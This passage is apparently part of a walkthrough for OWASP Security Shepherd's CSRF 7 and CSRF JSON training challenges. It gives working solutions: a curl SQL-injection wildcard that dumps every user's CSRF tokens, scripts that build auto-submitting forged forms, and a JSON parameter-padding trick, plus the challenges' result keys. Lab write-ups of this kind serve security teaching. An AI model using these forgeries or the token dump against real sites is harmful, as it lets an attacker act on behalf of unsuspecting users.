+<p>Also, getting it to work on Microsoft Edge browser was troublesome. The easiest way is to have the CSRF python web server down when the victim visits CSRF 7 page and get’s their CSRF token. Once gotten, as long as they just click the <span class="guilabel">Post Message</span> button their CSRF token doesn’t change; clicking that “CSRF 7” link on the left or do a page refresh changes their CSRF token. So catch them after visiting the page and only doing a series of <span class="guilabel">Post Message</span> attempts and you have their CSRF token stable.</p>
+<p>At that point, use the SQL injection (use “%” which is “%25” URL encoded) to fetch all the CSRF tokens:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE for getToken</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/user/csrfchallengeseven/getToken&#39;</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=1D675D7764629338EB58951799708197; token=77318319473905651039630792168793645034; JSESSIONID3=&quot;VT9mAw4zGTRwrS/TtAsmyA==&quot;&#39;</span>
+
+<span class="hll"><span class="c1"># This is the URL-encoded &quot;%&quot; MySQL wildcard.</span>
+</span>curl --silent --insecure  <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">?userId=%25&quot;</span>
+</span></pre></div>
+</div>
+<p>The output will be an HTML-garbled list of tokens. Guess the one for your victim:</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span>Your csrf Token for this Challenge is:
+<span class="ni">&amp;quot;</span>109047343535437488844995221280456065663<span class="ni">&amp;quot;</span> <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="hll"><span class="ni">&amp;quot;</span>112368035418168284095306472848852912912<span class="ni">&amp;quot;</span> <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span><span class="ni">&amp;quot;</span>136206915773510028589068378558105017785<span class="ni">&amp;quot;</span> <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</pre></div>
+</div>
+<p>With your userID (394682267744559fe293869075243bbefb22506f) and the newly-minted csrfToken (112368035418168284095306472848852912912), quickly create <code class="file docutils literal"><span class="pre">www/csrf7.html</span></code> and start up SimpleHTTPServer by editing then running this script:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Get csrfToken from SQL injection</span>
+</span><span class="hll"><span class="nv">CSRFTOKEN</span><span class="o">=</span><span class="s1">&#39;112368035418168284095306472848852912912&#39;</span>
+</span><span class="hll"><span class="c1"># Get userid from the web page.</span>
+</span><span class="hll"><span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+<span class="c1"># Create web page.</span>
+<span class="hll">cat &gt;www/csrf7.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+<span class="hll"><span class="s">&lt;form id=&quot;csrf7&quot; name=&quot;csrf7&quot; action=&quot;$SITE/user/csrfchallengeseven/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="hll"><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot; /&gt;</span>
+</span><span class="hll"><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;$CSRFTOKEN&quot; /&gt;</span>
+</span><span class="s">  &lt;input type=&quot;submit&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+<span class="s">&lt;script&gt;</span>
+<span class="s">document.csrf7.submit();</span>
+<span class="s">&lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Enter the following URL in the CSRF7 exercise <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf7.html">http://please.hack.me:8000/csrf7.html</a></div></blockquote>
+<p>The next time the victim clicks the <span class="guilabel">Post Message</span> button they should get “Increment Successful” in their web page. Then when you refresh your CSRF 7 page you should see:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go"> iZ2oXFsPSFev74qeQuU8PX3J0Rj/BET/IQhiQKvPCO+3sbtXf4Nl5puk9+O2yEtyOUWhBh4XaSejQIQMawqqQ/0XF7yzTJtN3JwbdZ4nRXae9ozSjFO5GId/a3pcqVaTHiXDjV4OH7f2lzFaYJNyNw==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-json">
+<h2>3.15.3.9. CSRF JSON<a class="headerlink" href="#csrf-json" title="Permalink to this headline">¶</a></h2>
+<p>First a note about passing JSON via a form. You might expect to read and follow the <a class="reference external" href="https://darobin.github.io/formic/specs/json/">JSON extension specification to HTML</a> and have enctype=’application/json’:</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span><span class="hll"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrfjson&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrfjson&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#39;application/json&#39;</span>
+</span>    <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://securityshepherd.com/user/csrfchallengejson/plusplus&quot;</span>
+    <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="hll">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;userId&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;394682267744559fe293869075243bbefb22506f&quot;</span><span class="p">/&gt;</span>
+</span>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">csrfjson</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span> <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p>But this will result in an error. From <a class="reference external" href="https://github.com/OWASP/SecurityShepherd/issues/116">CSRF expecting JSON packet #116</a>:</p>
+<blockquote>
+<div>User has to use enctype=”text/plain” in their attack to send well formed JSON cross domain without javascript.</div></blockquote>
+<p>Also, from <a class="reference external" href="http://security.stackexchange.com/questions/10227/csrf-with-json-post">CSRF With JSON POST</a>:</p>
+<blockquote>
+<div><p>It’s not possible to get a POSTed &lt;form&gt; to submit a request with Content-Type: application/json. But you can submit a form with a valid JSON structure in the body as enctype=”text/plain”.</p>
+<p>It’s not possible to do a cross-origin (CORS) XMLHttpRequest POST with Content-Type: application/json against a non-cross-origin-aware server because this will cause a ‘pre-flighting’ HTTP OPTIONS request to approve it first. But you can send a cross-origin XMLHttpRequest POST withCredentials if it is text/plain.</p>
+</div></blockquote>
+<p>We follow <a class="reference external" href="http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html">JSON CSRF with Parameter Padding</a> to create our “text/plain” JSON form. Realize a form field is expected to be encoded something like “name=value”; in fact, an extra “=” is placed before the value even without a value (“name=”). How can you encode <code class="docutils literal"><span class="pre">{&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:3}}</span></code>? If you try <code class="docutils literal"><span class="pre">&lt;input</span> <span class="pre">name='{&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:3}}'</span> <span class="pre">type='hidden'&gt;</span></code> the actual value sent will be <code class="docutils literal"><span class="pre">{&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:3}}=</span></code> (notice the trailing “=” that’s always added after the name). One way to solve this is to add a dummy value at the end of the JSON: <code class="docutils literal"><span class="pre">&lt;input</span> <span class="pre">name='{&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:3},</span> <span class="pre">&quot;ignore_me&quot;:&quot;'</span> <span class="pre">value='test&quot;}'</span> <span class="pre">type='hidden'&gt;</span></code>, which results in the JSON string <code class="docutils literal"><span class="pre">{&quot;a&quot;:1,&quot;b&quot;:{&quot;c&quot;:3},</span> <span class="pre">&quot;ignore_me&quot;:&quot;-test&quot;}</span></code>.</p>
+<p>In our case we’ll add an extra JSON value <code class="docutils literal"><span class="pre">&quot;,</span> <span class="pre">&quot;ignore_me&quot;:&quot;'</span> <span class="pre">value='yeah_me&quot;}'</span></code> which adds <code class="docutils literal"><span class="pre">{</span> <span class="pre">...</span> <span class="pre">,</span> <span class="pre">&quot;ignore_me&quot;:&quot;=yeah_me&quot;}</span></code> to the end of the JSON value.</p>
+<p>Using the userId from the challenge (394682267744559fe293869075243bbefb22506f), create <code class="file docutils literal"><span class="pre">www/csrfjson.html</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Get userid from the web page.</span>
+</span><span class="hll"><span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+</span><span class="hll"><span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+</span><span class="hll">cat &gt;www/csrfjson.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+<span class="hll"><span class="s">&lt;form id=&quot;csrfjson&quot; name=&quot;csrfjson&quot; enctype=&#39;text/plain&#39; action=&quot;$SITE/user/csrfchallengejson/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="hll"><span class="s">  &lt;input type=&quot;hidden&quot; name=&#39;{&quot;userId&quot;:&quot;$U&quot;,&quot;ignore_me&quot;:&quot;&#39; value=&#39;yeah_me&quot;}&#39;/&gt;</span>
+</span><span class="s">  &lt;input type=&quot;submit&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+<span class="s">&lt;script&gt;</span>
+<span class="s">document.csrfjson.submit();</span>
+<span class="s">&lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Next enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrfjson.html">http://please.hack.me:8000/csrfjson.html</a></div></blockquote>
+<p>Unfortunately, Microsoft Edge did not encode the form properly. Whether <code class="file docutils literal"><span class="pre">www/csrfjson.html</span></code> was in an iframe or as the main URL, the post to the server was <code class="docutils literal"><span class="pre">{%22userId%22:%22394682267744559fe293869075243bbefb22506f%22,%22ignore_me%22:%22=yeah_me&quot;}</span></code>. Note that all but the last double quote mark were URL encoded. This caused the error message “An Error Occurred! You must be getting funky!”.</p>
+<p>However, Firefox opening the CSRF JSON web page would not permit the loading of the iframe: no request was sent to the SimpleHTTPServer. But if you used Firefox to open URL <a class="reference external" href="http://please.hack.me:8000/csrfjson.html">http://please.hack.me:8000/csrfjson.html</a> directly, Firefox sent non-encoded double quotes (<code class="docutils literal"><span class="pre">{&quot;userId&quot;:&quot;394682267744559fe293869075243bbefb22506f&quot;,&quot;ignore_me&quot;:&quot;=yeah_me&quot;}</span></code>) with output “Increment Successful”.</p>
+<p>So both browsers prevented successfully completing the exercise: Microsoft Edge didn’t encode the form properly, while Firefox would not load the iframe.</p>
+<p>If we could get the victim to open <a class="reference external" href="http://please.hack.me:8000/csrfjson.html">http://please.hack.me:8000/csrfjson.html</a> correctly via the CSRF JSON lesson (making sure to display all content, not just secure content), the attacker’s CSRF counter should be incremented. Merely selecting the CSRF JSON lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">iSDnlqhzo2vECOx/vQjF2Wvf2yzTXBdmrA+BPkG0Pu5Hc9jTWf455jetxwtwRJ3ImduZoUHTaiTVbwLpUwPgLJ042qz4mYsvQAn6TEfK1eG3xnbc9vsJbNW4iKz/vPqP52YHhK5PmnGZpnWhAKS1xA==</span>
+</span></pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="security_shepherd_url_access.html" class="btn btn-neutral float-right" title="3.15.4. Failure to Restrict URL Access" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="security_shepherd_lessons.html" class="btn btn-neutral" title="3.15.2. Lessons" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
